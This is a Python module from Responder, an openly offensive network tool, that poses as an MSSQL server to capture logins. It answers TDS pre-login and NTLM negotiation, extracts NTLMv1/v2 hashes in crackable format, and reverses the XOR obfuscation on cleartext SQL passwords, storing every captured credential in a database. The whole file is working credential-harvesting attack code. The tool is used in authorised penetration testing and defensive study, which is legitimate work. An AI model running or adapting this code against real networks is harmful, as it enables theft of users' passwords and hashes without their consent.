#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

try:
    from socketserver import BaseRequestHandler
except ImportError:
    from SocketServer import BaseRequestHandler

from packets import MSSQLPreLoginAnswer, MSSQLNTLMChallengeAnswer
from utils import *
import struct
import binascii

class TDS_Login_Packet:
	def __init__(self, data):
		
		ClientNameOff      = struct.unpack('<h', data[44:46])[0]
		ClientNameLen      = struct.unpack('<h', data[46:48])[0]
		UserNameOff        = struct.unpack('<h', data[48:50])[0]
		UserNameLen        = struct.unpack('<h', data[50:52])[0]
		PasswordOff        = struct.unpack('<h', data[52:54])[0]
		PasswordLen        = struct.unpack('<h', data[54:56])[0]
		AppNameOff         = struct.unpack('<h', data[56:58])[0]
		AppNameLen         = struct.unpack('<h', data[58:60])[0]
		ServerNameOff      = struct.unpack('<h', data[60:62])[0]
		ServerNameLen      = struct.unpack('<h', data[62:64])[0]
		Unknown1Off        = struct.unpack('<h', data[64:66])[0]
		Unknown1Len        = struct.unpack('<h', data[66:68])[0]
		LibraryNameOff     = struct.unpack('<h', data[68:70])[0]
		LibraryNameLen     = struct.unpack('<h', data[70:72])[0]
		LocaleOff          = struct.unpack('<h', data[72:74])[0]
		LocaleLen          = struct.unpack('<h', data[74:76])[0]
		DatabaseNameOff    = struct.unpack('<h', data[76:78])[0]
		DatabaseNameLen    = struct.unpack('<h', data[78:80])[0]

		self.ClientName    = data[8+ClientNameOff:8+ClientNameOff+ClientNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.UserName      = data[8+UserNameOff:8+UserNameOff+UserNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.Password      = data[8+PasswordOff:8+PasswordOff+PasswordLen*2]
		self.AppName       = data[8+AppNameOff:8+AppNameOff+AppNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.ServerName    = data[8+ServerNameOff:8+ServerNameOff+ServerNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.Unknown1      = data[8+Unknown1Off:8+Unknown1Off+Unknown1Len*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.LibraryName   = data[8+LibraryNameOff:8+LibraryNameOff+LibraryNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.Locale        = data[8+LocaleOff:8+LocaleOff+LocaleLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')
		self.DatabaseName  = data[8+DatabaseNameOff:8+DatabaseNameOff+DatabaseNameLen*2].replace(b'\x00', b'').decode('utf-16le', 'ignore')


def ParseSQLHash(data, client):
	SSPIStart     = data[8:]

	LMhashLen     = struct.unpack('<H',data[20:22])[0]
	LMhashOffset  = struct.unpack('<H',data[24:26])[0]
	LMHash        = binascii.hexlify(SSPIStart[LMhashOffset:LMhashOffset+LMhashLen]).decode().upper()
	
	NthashLen     = struct.unpack('<H',data[30:32])[0]
	NthashOffset  = struct.unpack('<H',data[32:34])[0]
	NTHash        = binascii.hexlify(SSPIStart[NthashOffset:NthashOffset+NthashLen]).decode().upper()
	
	DomainLen     = struct.unpack('<H',data[36:38])[0]
	DomainOffset  = struct.unpack('<H',data[40:42])[0]
	Domain        = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace(b'\x00',b'').decode('utf-16le', 'ignore')
	
	UserLen       = struct.unpack('<H',data[44:46])[0]
	UserOffset    = struct.unpack('<H',data[48:50])[0]
	User          = SSPIStart[UserOffset:UserOffset+UserLen].replace(b'\x00',b'').decode('utf-16le', 'ignore')

	if NthashLen == 24:
		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'MSSQL', 
			'type': 'NTLMv1', 
			'client': client, 
			'user': Domain+'\\'+User, 
			'hash': LMHash+":"+NTHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 60:
		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
		
		SaveToDb({
			'module': 'MSSQL', 
			'type': 'NTLMv2', 
			'client': client, 
			'user': Domain+'\\'+User, 
			'hash': NTHash[:32]+":"+NTHash[32:], 
			'fullhash': WriteHash,
		})


def ParseSqlClearTxtPwd(Pwd):
	Pwd = [b for b in Pwd.replace(b'\xa5', b'')]
	Pw = ''
	for x in Pwd:
		val = x ^ 0xa5
		hex_str = hex(val)[2:].zfill(2)[::-1]
		Pw += binascii.unhexlify(hex_str).decode('latin1', 'ignore')
	return Pw


def ParseClearTextSQLPass(data, client):
	TDS = TDS_Login_Packet(data)
	SaveToDb({
		'module': 'MSSQL', 
		'type': 'Cleartext', 
		'client': client,
		'hostname': "%s (%s)" % (TDS.ServerName, TDS.DatabaseName),
		'user': TDS.UserName, 
		'cleartext': ParseSqlClearTxtPwd(TDS.Password), 
		'fullhash': TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password),
	})

# MSSQL Server class
class MSSQL(BaseRequestHandler):
	def handle(self):
		if settings.Config.Verbose:
			print(text("[MSSQL] Received connection from %s" % self.client_address[0]))
	
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(0.1)

				if not data:
					break

				if data[0:1] == b"\x12":  # Pre-Login Message
					Buffer = str(MSSQLPreLoginAnswer()).encode() if isinstance(MSSQLPreLoginAnswer(), str) else bytes(MSSQLPreLoginAnswer())
					self.request.send(Buffer)
					data = self.request.recv(1024)

				if data[0:1] == b"\x10":  # NegoSSP
					if b"NTLMSSP" in data:
						Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=settings.Config.Challenge)
						Packet.calculate()
						Buffer = bytes(Packet)
						self.request.send(Buffer)
						data = self.request.recv(1024)
					else:
						ParseClearTextSQLPass(data, self.client_address[0])

				if data[0:1] == b"\x11":  # NegoSSP Auth
					ParseSQLHash(data, self.client_address[0])

		except socket.timeout:
			self.request.close()
